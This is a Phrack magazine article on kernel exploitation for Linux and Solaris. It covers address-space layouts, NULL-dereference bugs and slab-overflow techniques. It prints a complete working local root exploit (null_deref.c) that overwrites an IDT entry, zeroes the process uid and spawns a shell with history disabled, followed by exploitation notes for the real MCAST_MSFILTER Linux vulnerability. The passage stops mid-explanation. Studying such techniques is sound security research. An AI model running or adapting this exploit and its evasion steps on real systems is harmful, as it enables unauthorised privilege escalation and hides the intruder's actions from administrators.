            _                                                  _
          _/B\_                                              _/W\_
          (* *)              Phrack #64 file 6               (* *)
          | - |                                              | - |
          |   | Attacking the Core : Kernel Exploiting Notes |   |
          |   |                                              |   |
          |   |       By sqrkkyu <sgrakkyu@antifork.org>     |   |
          |   |          twzi <twiz@email.it>                |   |
          |   |                                              |   |
          (______________________________________________________)



                             ==Phrack Inc.==

               Volume 0x00, Issue 0x00, Phile #0x00 of 0x00


|=------------=[ Attacking the Core : Kernel Exploiting Notes ]=---------=|
|=-----------------------------------------------------------------------=|
|=-------------=[ sgrakkyu@antifork.org and twiz@email.it ]=-------------=|
|=------------------------=[ February 12 2007 ]=-------------------------=|


------[  Index 

  1 - The playground 

    1.1 - Kernel/Userland virtual address space layouts
    1.2 - Dummy device driver and real vulnerabilities
    1.3 - Notes about information gathering

  2 - Kernel vulnerabilities and bugs 

    2.1 - NULL/userspace dereference vulnerabilities
        2.1.1 - NULL/userspace dereference vulnerabilities : null_deref.c 
    2.2 - The Slab Allocator
        2.2.1 - Slab overflow vulnerabilities
        2.2.2 - Slab overflow exploiting : MCAST_MSFILTER
        2.2.3 - Slab overflow vulnerabilities : Solaris notes 
    2.3 - Stack overflow vulnerabilities 
        2.3.1 - UltraSPARC exploiting
        2.3.2 - A reliable Solaris/UltraSPARC exploit
    2.4 - A primer on logical bugs : race conditions 
        2.4.1 - Forcing a kernel path to sleep
        2.4.2 - AMD64 and race condition exploiting: sendmsg

  3 - Advanced scenarios 
    
    3.1 - PaX KERNEXEC & separated kernel/user space 
    3.2 - Remote Kernel Exploiting 
        3.2.1 - The Network Contest
        3.2.2 - Stack Frame Flow Recovery
        3.2.3 - Resources Restoring 
        3.2.4 - Copying the Stub
        3.2.5 - Executing Code in Userspace Context [Gimme Life!]
        3.2.6 - The Code : sendtwsk.c

  4 - Final words  

  5 - References

  6 - Sources : drivers and exploits [stuff.tgz]      

------[ Intro 


The latest years have seen an increasing interest towards kernel based
explotation. The growing diffusion of "security prevention" approaches
(no-exec stack, no-exec heap, ascii-armored library mmapping, mmap/stack
and generally virtual layout randomization, just to point out the most
known) has/is made/making userland explotation harder and harder. 
Moreover there has been an extensive work of auditing on application codes,
so that new bugs are generally more complex to handle and exploit. 

The attentions has so turned towards the core of the operating systems,
towards kernel (in)security. This paper will attempt to give an insight
into kernel explotation, with examples for IA-32, UltraSPARC and AMD64. 
Linux and Solaris will be the target operating systems. More precisely, an
architecture on turn will be the main covered for the three main
exploiting demonstration categories : slab (IA-32), stack (UltraSPARC) and
race condtion (AMD64). The details explained in those 'deep focus' apply,
thou, almost in toto to all the others exploiting scenarios.     

Since explotation examples are surely interesting but usually do not show
the "effective" complexity of taking advantages of vulnerabilities, a
couple of working real-life exploits will be presented too.   


------[ 1 - The playground 


Let's just point out that, before starting : "bruteforcing" and "kernel"
aren't two words that go well together. One can't just crash over and
over the kernel trying to guess the right return address or the good
alignment. An error in kernel explotation leads usually to a crash,
panic or unstable state of the operating system.
The "information gathering" step is so definitely important, just like
a good knowledge of the operating system layout.  
 

---[ 1.1 - Kernel/Userland virtual address space layouts 

From the userland point of view, we don't see almost anything of the
kernel layout nor of the addresses at which it is mapped [there are
indeed a couple of information that we can gather from userland, and
we're going to point them out after]. 
Netherless it is from the userland that we have to start to carry out our
attack and so a good knowledge of the kernel virtual memory layout
(and implementation) is, indeed, a must. 

There are two possible address space layouts :

- kernel space on behalf of user space (kernel page tables are
replicated over every process; the virtual address space is splitted in
two parts, one for the kernel and one for the processes).  
Kernels running on x86, AMD64 and sun4m/sun4d architectures usually have
this kind of implementation. 

- separated kernel and process address space (both can use the whole
address space). Such an implementation, to be efficient, requires a 
dedicated support from the underlaining architecture. It is the case of
the primary and secondary context register used in conjunction with the
ASI identifiers on the UltraSPARC (sun4u/sun4v) architecture.   

To see the main advantage (from an exploiting perspective) of the first
approach over the second one we need to introduce the concept of
"process context".   
Any time the CPU is in "supervisor" mode (the well-known ring0 on ia-32),
the kernel path it is executing is said to be in interrupt context if it
hasn't a backing process.
Code in interrupt context can't block (for example waiting for demand
paging to bring in a referenced userspace page): the scheduler is
unable to know what to put to sleep (and what to wake up after). 

Code running in process context has instead an associated process
(usually the one that "generated" the kernel code path, for example
issuing a systemcall) and is free to block/sleep (and so, it's free to
reference the userland virtual address space). 
 
This is a good news on systems which implement a combined user/kernel
address space, since, while executing at kernel level, we can
dereference (or jump to) userland addresses. 
The advantages are obvious (and many) :

  - we don't have to "guess" where our shellcode will be and we can
    write it in C (which makes easier the writing, if needed, of long and
    somehow complex recovery code)

  - we don't have to face the problem of finding a suitable large and
    safe place to store it. 

  - we don't have to worry about no-exec page protection (we're free to
    mmap/mremap as we wish, and, obviously, load directly the code in
    .text segment, if we don't need to patch it at runtime). 

  - we can mmap large portions of the address space and fill them with 
    nops or nop-alike code/data (useful when we don't completely
    control the return address or the dereference)

  - we can easily take advantage of the so-called "NULL pointer
    dereference bugs" ("technically" described later on)
    
The space left to the kernel is so limited in size : on the x86
architecture it is 1 Gigabyte on Linux and it fluctuates on Solaris
depending on the amount of physical memory (check
usr/src/uts/i86pc/os/startup.c inside Opensolaris sources).
This fluctuation turned out to be necessary to avoid as much as possible
virtual memory ranges wasting and, at the same time, avoid pressure over
the space reserved to the kernel.  

The only limitation to kernel (and processes) virtual space on systems
implementing an userland/kerneland separated address space is given by the
architecture (UltraSPARC I and II can reference only 44bit of the whole
64bit addressable space. This VA-hole is placed among 0x0000080000000000
and 0xFFFFF7FFFFFFFFFF).  

This memory model makes explotation indeed harder, because we can't
directly dereference the userspace. The previously cited NULL pointer
dereferences are pretty much un-exploitable.
Moreover, we can't rely on "valid" userland addresses as a place to store
our shellcode (or any other kernel emulation data), neither we can "return
to userspace". 

We won't go more in details here with a teorical description of the
architectures (you can check the reference manuals at [1], [2] and [3])
since we've preferred to couple the analysis of the architectural and
operating systems internal aspects relevant to explotation with the
effective exploiting codes presentation.


---[ 1.2 - Dummy device driver and real vulnerabilities 

As we said in the introduction, we're going to present a couple of real
working exploit, hoping to give a better insight into the whole kernel
explotation process. 
We've written exploit for : 

-  MCAST_MSFILTER vulnerability [4], used to demonstrate kernel slab
   overflow exploiting

-  sendmsg vulnerability [5], used to demonstrate an effective race
   condition (and a stack overflow on AMD64) 

-  madwifi SIOCGIWSCAN buffer overflow [21], used to demonstrate a real
   remote exploit for the linux kernel. That exploit was already released
   at [22] before the exit of this paper (which has a more detailed
   discussion of it and another 'dummy based' exploit for a more complex
   scenario)

Moreover, we've written a dummy device driver (for Linux and Solaris) to
demonstrate with examples the techniques presented. 
A more complex remote exploit (as previously mentioned) and an exploit 
capable to circumvent Linux with PaX/KERNEXEC (and userspace/kernelspace
separation) will be presented too.

---[ 1.3 - Notes about information gathering 


Remember when we were talking about information gathering ? Nearly every
operating systems 'exports' to userland information useful for developing
and debugging. Both Linux and Solaris (we're not taking in account now
'security patches') expose readable by the user the list and addresses of
their exported symbols (symbols that module writer can reference) :
/proc/ksyms on Linux 2.4, /proc/kallsyms on Linux 2.6 and /dev/ksyms on
Solaris (the first two are text files, the last one is an ELF with SYMTAB
section).
Those files provide useful information about what is compiled in inside
the kernel and at what addresses are some functions and structs, addresses
that we can gather at runtime and use to increase the reliability of our
exploit. 

But theese information could be missing on some environment, the /proc
filesystem could be un-mounted or the kernel compiled (along with some
security switch/patch) to not export them. 
This is more a Linux problem than a Solaris one, nowadays. Solaris exports
way more information than Linux (probably to aid in debugging without
having the sources) to the userland. Every module is shown with its
loading address by 'modinfo', the proc interface exports the address of
the kernel 'proc_t' struct to the userland (giving a crucial entrypoint,
as we will see, for the explotation on UltraSPARC systems) and the 'kstat'
utility lets us investigate on many kernel parameters. 

In absence of /proc (and /sys, on Linux 2.6) there's another place we can
gather information from, the kernel image on the filesystem. 
There are actually two possible favourable situations :

  - the image is somewhere on the filesystem and it's readable, which is
    the default for many Linux distributions and for Solaris

  - the target host is running a default kernel image, both from
    installation or taken from repository. In that situation is just a
    matter of recreating the same image on our system and infere from it. 
    This should be always possible on Solaris, given the patchlevel (taken
    from 'uname' and/or 'showrev -p'). 
    Things could change if OpenSolaris takes place, we'll see. 

The presence of the image (or the possibility of knowing it) is crucial
for the KERN_EXEC/separated userspace/kernelspace environment explotation
presented at the end of the paper. 

Given we don't have exported information and the careful administrator has
removed running kernel images (and, logically, in absence of kernel memory
leaks ;)) we've one last resource that can help in explotation : the
architecture. 
Let's take the x86 arch, a process running at ring3 may query the logical
address and offset/attribute of processor tables GDT,LDT,IDT,TSS :

- through 'sgdt' we get the base address and max offset of the GDT 
- through 'sldt' we can get the GDT entry index of current LDT 
- through 'sidt' we can get the base address and max offset of IDT 
- through 'str'  we can get the GDT entry index of the current TSS 

The best choice (not the only one possible) in that case is the IDT. The
possibility to change just a single byte in a controlled place of it 
leads to a fully working reliable exploit [*]. 

[*] The idea here is to modify the MSB of the base_address of an IDT entry
    and so "hijack" the exception handler. Logically we need a controlled
    byte overwriting or a partially controlled one with byte value below
    the 'kernelbase' value, so that we can make it point into the userland
    portion. We won't go in deeper details about the IDT
    layout/implementation here, you can find them inside processor manuals
    [1] and kad's phrack59 article "Handling the Interrupt Descriptor
    Table" [6].
    The NULL pointer dereference exploit presented for Linux implements
    this technique.  

As important as the information gathering step is the recovery step, which
aims to leave the kernel in a consistent state. This step is usually
performed inside the shellcode itself or just after the exploit has
(successfully) taken place, by using /dev/kmem or a loadable module (if
possible). 
This step is logically exploit-dependant, so we will just explain it along
with the examples (making a categorization would be pointless). 


------[ 2 - Kernel vulnerabilities and bugs 

 
We start now with an excursus over the various typologies of kernel
vulnerabilities. The kernel is a big and complex beast, so even if we're
going to track down some "common" scenarios, there are a lot of more
possible "logical bugs" that can lead to a system compromise.

We will cover stack based, "heap" (better, slab) based and NULL/userspace
dereference vulnerabilities. As an example of a "logical bug" a whole
chapter is dedicated to race condition and techniques to force a kernel
path to sleep/reschedule (along with a real exploit for the sendmsg [4]
vulnerability on AMD64). 

We won't cover in this paper the range of vulnerabilities related to
virtual memory logical errors, since those have been already extensively
described and cleverly exploited, on Linux, by iSEC [7] people.
Moreover, it's nearly useless, in our opinion, to create a "crafted" 
demonstrative vulnerable code for logical bugs and we weren't aware of any
_public_ vuln of this kind on Solaris. If you are, feel free to submit it,
we'll be happy to work over ;). 


---[ 2.1 - NULL/userspace dereference vulnerabilities 


This kind of vulnerability derives from the using of a pointer
not-initialized (generally having a NULL value) or trashed, so that it
points inside the userspace part of the virtual memory address space.
The normal behaviour of an operating system in such a situation is an oops
or a crash (depending on the degree of severity of the dereference) while
attempting to access un-mapped memory. 

But we can, obviously, mmap that memory range and let the kernel find
"valid" malicius data. That's more than enough to gain root priviledges. 
We can delineate two possible scenarios :

  - instruction pointer modification (direct call/jmp dereference,
    called function pointers inside a struct, etc)

  - "controlled" write on kernelspace 

The first kind of vulnerability is really trivial to exploit, it's just a
matter of mmapping the referenced page and put our shellcode there.
If the dereferenced address is a struct with inside a function pointer (or
a chain of struct with somewhere a function pointer), it is just a matter
of emulating in userspace those struct, make point the function pointer
to our shellcode and let/force the kernel path to call it.

We won't show an example of this kind of vulnerability since this is the
"last stage" of any more complex exploit (as we will see, we'll be always
trying, when possible, to jump to userspace).  

The second kind of vulnerability is a little more complex, since we can't
directly modify the instruction pointer, but we've the possibility to
write anywhere in kernel memory (with controlled or uncontrolled data). 

Let's get a look to that snipped of code, taken from our Linux dummy
device driver :

< stuff/drivers/linux/dummy.h >

[...]

struct user_data_ioctl
{
  int size;  
  char *buffer;
};

< / >

< stuff/drivers/linux/dummy.c >

static int alloc_info(unsigned long sub_cmd)
{
  struct user_data_ioctl user_info;
  struct info_user *info;
  struct user_perm *perm;
  
[...]

  if(copy_from_user(&user_info,
                    (void __user*)sub_cmd,
                    sizeof(struct user_data_ioctl)))
    return -EFAULT;

  if(user_info.size > MAX_STORE_SIZE)  [1]
    return -ENOENT;

  info = kmalloc(sizeof(struct info_user), GFP_KERNEL);
  if(!info)
    return -ENOMEM;

  perm = kmalloc(sizeof(struct user_perm), GFP_KERNEL);
  if(!perm)
    return -ENOMEM;

  info->timestamp = 0;//sched_clock();
  info->max_size  = user_info.size;
  info->data = kmalloc(user_info.size, GFP_KERNEL); [2]
  /* unchecked alloc */

  perm->uid = current->uid;
  info->data->perm = perm; [3]

  glob_info = info;

[...]

static int store_info(unsigned long sub_cmd)
{

[...]

  glob_info->data->perm->uid = current->uid; [4]

[...]   

< / > 

Due to the integer signedness issue at [1], we can pass a huge value
to the kmalloc at [2], making it fail (and so return NULL). 
The lack of checking at that point leaves a NULL value in the info->data
pointer, which is later used, at [3] and also inside store_info at [4] to
save the current uid value. 

What we have to do to exploit such a code is simply mmap the zero page
(0x00000000 - NULL) at userspace, make the kmalloc fail by passing a
negative value and then prepare a 'fake' data struct in the previously
mmapped area, providing a working pointers for 'perm' and thus being able
to write our 'uid' anywhere in memory.  

At that point we have many ways to exploit the vulnerable code (exploiting
while being able to write anywhere some arbitrary or, in that case,
partially controlled data is indeed limited only by imagination), but it's
better to find a "working everywhere" way.

As we said above, we're going to use the IDT and overwrite one of its
entries (more precisely a Trap Gate, so that we're able to hijack an
exception handler and redirect the code-flow towards userspace).
Each IDT entry is 64-bit (8-bytes) long and we want to overflow the
'base_offset' value of it, to be able to modify the MSB of the exception
handler routine address and thus redirect it below PAGE_OFFSET
(0xc0000000) value. 
   
Since the higher 16 bits are in the 7th and 8th byte of the IDT entry,
that one is our target, but we're are writing at [4] 4 bytes for the 'uid'
value, so we're going to trash the next entry. It is better to use two
adiacent 'seldomly used' entries (in case, for some strange reason,
something went bad) and we have decided to use the 4th and 5th entries :
#OF (Overflow Exception) and #BR (BOUND Range Exeeded Exeption).

At that point we don't control completely the return address, but that's
not a big problem, since we can mmap a large region of the userspace and
fill it with NOPs, to prepare a comfortable and safe landing point for our
exploit. The last thing we have to do is to restore, once we get the
control flow at userspace, the original IDT entries, hardcoding the values
inside the shellcode stub or using an lkm or /dev/kmem patching code. 

At that point our exploit is ready to be launched for our first
'rootshell'. 

As a last (indeed obvious) note, NULL dereference vulnerabilities are 
only exploitable on 'combined userspace and kernelspace' memory model
operating systems.


---[ 2.1.1 - NULL/userspace dereference vulnerabilities : null_deref.c  

< stuff/expl/null_deref.c >

#include <sys/ioctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "dummy.h"

#define DEVICE          "/dev/dummy"
#define NOP             0x90
#define STACK_SIZE      8192

//#define STACK_SIZE 4096


#define PAGE_SIZE       0x1000
#define PAGE_OFFSET     12
#define PAGE_MASK       ~(PAGE_SIZE -1)

#define ANTANI          "antani"

uint32_t        bound_check[2]={0x00,0x00};
extern void     do_it();
uid_t           UID;

void do_bound_check()
{
        asm volatile("bound %1, %0\t\n" : "=m"(bound_check) : "a"(0xFF));
}

/* simple shell spown */
void get_root()
{
  char *argv[] = { "/bin/sh", "--noprofile", "--norc", NULL };
  char *envp[] = { "TERM=linux", "PS1=y0y0\\$", "BASH_HISTORY=/dev/null",
                   "HISTORY=/dev/null", "history=/dev/null",
                   "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

  execve("/bin/sh", argv, envp);
  fprintf(stderr, "[**] Execve failed\n");
  exit(-1);
}



/* this function is called by fake exception handler: take 0 uid and restore trashed entry */
void give_priv_and_restore(unsigned int thread)
{
  int i;
  unsigned short addr;
  unsigned int* p = (unsigned int*)thread;

  /* simple trick */
  for(i=0; i < 0x100; i++)
  if( (p[i] == UID) && (p[i+1] == UID) && (p[i+2] == UID) && (p[i+3] == UID) )
    p[i] = 0, p[i+1] = 0;

}


#define CODE_SIZE       0x1e


void dummy(void)
{
asm("do_it:;"
    "addl $6, (%%esp);"  // after bound exception EIP points again to the bound instruction
    "pusha;"
    "movl %%esp, %%eax;"
    "andl %0, %%eax;"
    "movl (%%eax), %%eax;"
    "add $100, %%eax;"
    "pushl %%eax;"
    "movl $give_priv_and_restore, %%ebx;"
    "call *%%ebx;"
    "popl %%eax;"
    "popa;"
    "iret;"
    "nop;nop;nop;nop;"
   :: "i"( ~(STACK_SIZE -1))
);
return;
}



struct idt_struct
{
  uint16_t limit;
  uint32_t base;
} __attribute__((packed));


static char *allocate_frame_chunk(unsigned int base_addr,
                                  unsigned int size,
                                  void* code_addr)
{
  unsigned int round_addr = base_addr & PAGE_MASK;
  unsigned int diff       = base_addr - round_addr;
  unsigned int len        = (size + diff + (PAGE_SIZE-1)) & PAGE_MASK;

  char *map_addr = mmap((void*)round_addr,
                        len,
                        PROT_READ|PROT_WRITE,
                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,
                        0,
                        0);
  if(map_addr == MAP_FAILED)
    return MAP_FAILED;

  if(code_addr)
  {
    memset(map_addr, NOP, len);
    memcpy(map_addr, code_addr, size);
  }
  else
    memset(map_addr, 0x00, len);

  return (char*)base_addr;
}

inline unsigned int *get_zero_page(unsigned int size)
{
  return (unsigned int*)allocate_frame_chunk(0x00000000, size, NULL);
}

#define BOUND_ENTRY 5
unsigned int get_BOUND_address()
{
        struct idt_struct idt;
        asm volatile("sidt %0\t\n" : "=m"(idt));
        return idt.base + (8*BOUND_ENTRY);
}

unsigned int prepare_jump_code()
{
  UID = getuid();       /* set global uid */
  unsigned int base_address = ((UID & 0x0000FF00) << 16) + ((UID & 0xFF) << 16);
  printf("Using base address of: 0x%08x-0x%08x\n", base_address, base_address + 0x20000 -1);
  char *addr = allocate_frame_chunk(base_address, 0x20000, NULL);
  if(addr == MAP_FAILED)
  {
    perror("unable to mmap jump code");
    exit(-1);
  }

  memset((void*)base_address, NOP, 0x20000);
  memcpy((void*)(base_address + 0x10000), do_it, CODE_SIZE);

  return base_address;
}

int main(int argc, char *argv[])
{
  struct user_data_ioctl user_ioctl;
  unsigned int *zero_page, *jump_pages, save_ptr;

  zero_page = get_zero_page(PAGE_SIZE);
  if(zero_page == MAP_FAILED)
  {
    perror("mmap: unable to map zero page");
    exit(-1);
  }

  jump_pages = (unsigned int*)prepare_jump_code();


  int ret, fd = open(DEVICE,  O_RDONLY), alloc_size;

  if(argc > 1)
    alloc_size = atoi(argv[1]);
  else
   alloc_size  = PAGE_SIZE-8;

  if(fd < 0)
  {
    perror("open: dummy device");
    exit(-1);
  }

  memset(&user_ioctl, 0x00, sizeof(struct user_data_ioctl));
  user_ioctl.size = alloc_size;


  ret = ioctl(fd, KERN_IOCTL_ALLOC_INFO, &user_ioctl);
  if(ret < 0)
  {
    perror("ioctl KERN_IOCTL_ALLOC_INFO");
    exit(-1);
  }


  /* save old struct ptr stored by kernel in the first word */
  save_ptr = *zero_page;

  /* compute the new ptr inside the IDT table between BOUND and INVALIDOP exception */
  printf("IDT bound: %x\n", get_BOUND_address());
  *zero_page = get_BOUND_address() + 6;

  user_ioctl.size=strlen(ANTANI)+1;
  user_ioctl.buffer=ANTANI;

  ret = ioctl(fd, KERN_IOCTL_STORE_INFO, &user_ioctl);

  getchar();
  do_bound_check();

  /* restore trashed ptr */
  *zero_page = save_ptr;

  ret = ioctl(fd, KERN_IOCTL_FREE_INFO, NULL);
  if(ret < 0)
  {
    perror("ioctl KERN_IOCTL_FREE_INFO");
    exit(-1);
  }

  get_root();

  return 0;
}

< / > 



---[ 2.2 - The Slab Allocator 


The main purpose of a slab allocator is to fasten up the
allocation/deallocation of heavily used small 'objects' and to reduce the
fragmentation that would derive from using the page-based one.
Both Solaris and Linux implement a slab memory allocator which derives
from the one described by Bonwick [8] in 1994 and implemented in Solaris
2.4.

The idea behind is, basically : objects of the same type are grouped
together inside a cache in their constructed form. The cache is divided in
'slabs', consisting of one or more contiguos page frames.   
Everytime the Operating Systems needs more objects, new page frames (and
thus new 'slabs') are allocated and the object inside are constructed.
Whenever a caller needs one of this objects, it gets returned an already
prepared one, that it has only to fill with valid data. When an object is
'freed', it doesn't get destructed, but simply returned to its slab and
marked as available. 

Caches are created for the most used objects/structs inside the operating
system, for example those representing inodes, virtual memory areas, etc. 
General-purpose caches, suitables for small memory allocations, are 
created too, one for each power of two, so that internal fragmentation is
guaranted to be at least below 50%. 
The Linux kmalloc() and the Solaris kmem_alloc() functions use exactly
those latter described caches. Since it is up to the caller to 'clean' the
object returned from a slab (which could contain 'dead' data), wrapper
functions that return zeroed memory are usually provided too (kzalloc(),
kmem_zalloc()). 

An important (from an exploiting perspective) 'feature' of the slab
allocator is the 'bufctl', which is meaningful only inside a free object,
and is used to indicate the 'next free object'.
A list of free object that behaves just like a LIFO is thus created, and
we'll see in a short that it is crucial for reliable explotation. 

To each slab is associated a controlling struct (kmem_slab_t on Solaris,
slab_t on Linux) which is stored inside the slab (at the start, on Linux,
at the end, on Solaris) if the object size is below a given limit (1/8 of
the page), or outside it.
Since there's a 'cache' per 'object type', it's not guaranted at all that
those 'objects' will stay exactly in a page boundary inside the slab. That
'free' space (space not belonging to any object, nor to the slab
controlling struct) is used to 'color' the slab, respecting the object
alignment (if 'free' < 'alignment' no coloring takes place).

The first object is thus saved at a 'different offset' inside the slab,
given from 'color value' * 'alignment', (and, consequently, the same
happens to all the subsequent objects), so that object of the same size in
different slabs will less likely end up in the same hardware cache lines. 

We won't go more in details about the Slab Allocator here, since it is
well and extensively explained in many other places, most notably at [9],
[10], and [11], and we move towards effective explotation. 
Some more implementation details will be given, thou, along with the
exploiting techniques explanation.


---[ 2.2.1 - Slab overflow vulnerabilities  


NOTE: as we said before, Solaris and Linux have two different function to
alloc from the general purpose caches, kmem_alloc() and kmalloc(). That
two functions behave basically in the same manner, so, from now on we'll
just use 'kmalloc' and 'kmalloc'ed memory' in the discussion, referring
thou to both the operating systems implementation. 

A slab overflow is simply the writing past the buffer boundaries of a
kmalloc'ed object. The result of this overflow can be :

- overwriting an adiacent in-slab object. 
- overwriting a page next to the slab one, in the case we're overwriting
  past the last object.
- overwriting the control structure associated with the slab (Solaris
  only)
   
The first case is the one we're going to show an exploit for. The main
idea on such a situation is to fill the slabs (we can track the slab
status thanks to /proc/slabinfo on Linux and kstat -n 'cache_name' on
Solaris) so that a new one is necessary.
We do that to be sure that we'll have a 'controlled' bufctl : since the
whole slabs were full, we got a new page, along with a 'fresh' bufctl 
pointer starting from the first object.

At that point we alloc two objects, free the first one and trigger the
vulnerable code : it will request a new object and overwrite right into
the previously allocated second one. If a pointer inside this second
object is stored and then used (after the overflow) it is under our
control.
This approach is very reliable.  

The second case is more complex, since we haven't an object with a pointer
or any modifiable data value of interest to overwrite into. We still have
one chance, thou, using the page frame allocator. 
We start eating a lot of memory requesting the kind of 'page' we want to
overflow into (for example, tons of filedescriptor), putting the memory
under pressure. At that point we start freeing a couple of them, so that
the total amount counts for a page.  
At that point we start filling the slab so that a new page is requested.
If we've been lucky the new page is going to be just before one of the
previously allocated ones and we've now the chance to overwrite it. 

The main point affecting the reliability of such an exploit is : 

  - it's not trivial to 'isolate' a given struct/data to mass alloc at the
    first step, without having also other kernel structs/data growing
    together with.
    An example will clarify : to allocate tons of file descriptor we need
    to create a large amount of threads. That translates in the allocation
    of all the relative control structs which could end up placed right
    after our overflowing buffer.

The third case is possible only on Solaris, and only on slabs which keep
objects smaller than 'page_size >> 3'. Since Solaris keeps the kmem_slab
struct at the end of the slab we can use the overflow of the last object
to overwrite data inside it. 

In the latter two 'typology' of exploit presented we have to take in
account slab coloring. Both the operating systems store the 'next color
offset' inside the cache descriptor, and update it at every slab
allocation (let's see an example from OpenSolaris sources) :

< usr/src/uts/common/os/kmem.c >

static kmem_slab_t *
kmem_slab_create(kmem_cache_t *cp, int kmflag)
{
[...]
        size_t color, chunks;
[...]
        color = cp->cache_color + cp->cache_align;
        if (color > cp->cache_maxcolor)
                color = cp->cache_mincolor;
        cp->cache_color = color;

< / >

'mincolor' and 'maxcolor' are calculated at cache creation and represent
the boundaries of available caching :

# uname -a
SunOS principessa 5.9 Generic_118558-34 sun4u sparc SUNW,Ultra-5_10
# kstat -n file_cache | grep slab
        slab_alloc                      280
        slab_create                     2
        slab_destroy                    0
        slab_free                       0
        slab_size                       8192
# kstat -n file_cache | grep align
        align                           8
# kstat -n file_cache | grep buf_size
        buf_size                        56
# mdb -k
Loading modules: [ unix krtld genunix ip usba nfs random ptm ]
> ::sizeof kmem_slab_t
sizeof (kmem_slab_t) = 0x38
> ::kmem_cache ! grep file_cache
00000300005fed88 file_cache                0000 000000       56      290
> 00000300005fed88::print kmem_cache_t cache_mincolor
cache_mincolor = 0
> 00000300005fed88::print kmem_cache_t cache_maxcolor
cache_maxcolor = 0x10
> 00000300005fed88::print kmem_cache_t cache_color
cache_color = 0x10
> ::quit

As you can see, from kstat we know that 2 slabs have been created and we
know the alignment, which is 8. Object size is 56 bytes and the size of
the in-slab control struct is 56, too. Each slab is 8192, which, modulo 56
gives out exactly 16, which is the maxcolor value (the color range is thus
0 - 16, which leads to three possible coloring with an alignment of 8). 

Based on the previous snippet of code, we know that first allocation had
a coloring of 8 ( mincolor == 0 + align == 8 ), the second one of 16
(which is the value still recorded inside the kmem_cache_t). 
If we were for exhausting this slab and get a new one we would know for
sure that the coloring would be 0. 

Linux uses a similar 'circolar' coloring too, just look forward for
'kmem_cache_t'->colour_next setting and incrementation. 

Both the operating systems don't decrement the color value upon freeing of
a slab, so that has to be taken in account too (easy to do on Solaris,
since slab_create is the maximum number of slabs created).


---[ 2.2.2 - Slab overflow exploiting : MCAST_MSFILTER 


Given the technical basis to understand and exploit a slab overflow, it's
time for a practical example. 
We're presenting here an exploit for the MCAST_MSFILTER [4] vulnerability
found by iSEC people :

< linux-2.4.24/net/ipv4/ip_sockglue.c >

case MCAST_MSFILTER:
{
        struct sockaddr_in *psin;
        struct ip_msfilter *msf = 0;
        struct group_filter *gsf = 0;
        int msize, i, ifindex;

        if (optlen < GROUP_FILTER_SIZE(0))
                goto e_inval;
        gsf = (struct group_filter *)kmalloc(optlen,GFP_KERNEL); [2]
        if (gsf == 0) {
                err = -ENOBUFS;
                break;
        }
        err = -EFAULT;
        if (copy_from_user(gsf, optval, optlen)) {  [3]
                goto mc_msf_out;
        }
        if (GROUP_FILTER_SIZE(gsf->gf_numsrc) < optlen) { [4]
                err = EINVAL;
                goto mc_msf_out;
        }
        msize = IP_MSFILTER_SIZE(gsf->gf_numsrc);  [1]
        msf = (struct ip_msfilter *)kmalloc(msize,GFP_KERNEL); [7]
        if (msf == 0) {
                err = -ENOBUFS;
                goto mc_msf_out;
        }
	
	[...]

        msf->imsf_multiaddr = psin->sin_addr.s_addr;
        msf->imsf_interface = 0;
        msf->imsf_fmode = gsf->gf_fmode;
        msf->imsf_numsrc = gsf->gf_numsrc;
        err = -EADDRNOTAVAIL;
        for (i=0; i<gsf->gf_numsrc; ++i) {  [5]
                psin = (struct sockaddr_in *)&gsf->gf_slist[i];

                if (psin->sin_family != AF_INET) [8]
                        goto mc_msf_out;
                msf->imsf_slist[i] = psin->sin_addr.s_addr; [6]

[...]
	mc_msf_out:
                        if (msf)
                                kfree(msf);
                        if (gsf)
                                kfree(gsf);
                        break;

[...]

< / >

< linux-2.4.24/include/linux/in.h >

#define IP_MSFILTER_SIZE(numsrc) \    [1]
        (sizeof(struct ip_msfilter) - sizeof(__u32) \
        + (numsrc) * sizeof(__u32))

[...]

#define GROUP_FILTER_SIZE(numsrc) \   [4]
        (sizeof(struct group_filter) - sizeof(struct
__kernel_sockaddr_storage) \
        + (numsrc) * sizeof(struct __kernel_sockaddr_storage))

< / >


The vulnerability consist of an integer overflow at [1], since we control
the gsf struct as you can see from [2] and [3].
The check at [4] proved to be, initially, a problem, which was resolved
thanks to the slab property of not cleaning objects on free (back on that
in a short).
The for loop at [5] is where we effectively do the overflow, by writing,
at [6], the 'psin->sin_addr.s_addr' passed inside the gsf struct over the
previously allocated msf [7] struct (kmalloc'ed with bad calculated 
'msize' value). 
This for loop is a godsend, because thanks to the check at [8] we are able
to avoid the classical problem with integer overflow derived bugs (that is
writing _a lot_ after the buffer due to the usually huge value used to
trigger the overflow) and exit cleanly through mc_msf_out. 

As explained before, while describing the 'first explotation approach', we
need to find some object/data that gets kmalloc'ed in the same slab and 
which has inside a pointer or some crucial-value that would let us change
the execution flow.

We found a solution with the 'struct shmid_kernel' :

< linux-2.4.24/ipc/shm.c >

struct shmid_kernel /* private to the kernel */
{
        struct kern_ipc_perm    shm_perm;
        struct file *           shm_file;
        int                     id;
	[...]
};

[...]

asmlinkage long sys_shmget (key_t key, size_t size, int shmflg)
{
        struct shmid_kernel *shp;
        int err, id = 0;

        down(&shm_ids.sem);
        if (key == IPC_PRIVATE) {
                err = newseg(key, shmflg, size);
[...]

static int newseg (key_t key, int shmflg, size_t size)
{
[...]
        shp = (struct shmid_kernel *) kmalloc (sizeof (*shp), GFP_USER);
[...]
}

As you see, struct shmid_kernel is 64 bytes long and gets allocated using
kmalloc (size-64) generic cache [ we can alloc as many as we want (up to
fill the slab) using subsequent 'shmget' calls ].
Inside it there is a struct file pointer, that we could make point, thanks
to the overflow, to the userland, where we will emulate all the necessary
structs to reach a function pointer dereference (that's exactly what the
exploit does). 

Now it is time to force the msize value into being > 32 and =< 64, to make
it being alloc'ed inside the same (size-64) generic cache. 
'Good' values for gsf->gf_numsrc range from 0x40000005 to 0x4000000c. 
That raises another problem : since we're able to write 4 bytes for
every __kernel_sockaddr_storage present in the gsf struct we need a pretty
large one to reach the 'shm_file' pointer, and so we need to pass a large
'optlen' value.
The 0x40000005 - 0x4000000c range, thou, makes the GROUP_FILTER_SIZE() macro
used at [4] evaluate to a positive and small value, which isn't large
enough to reach the 'shm_file' pointer. 

We solved that problem thanks to the fact that, once an object is free'd,
its 'memory contents' are not zero'ed (or cleaned in any way). 
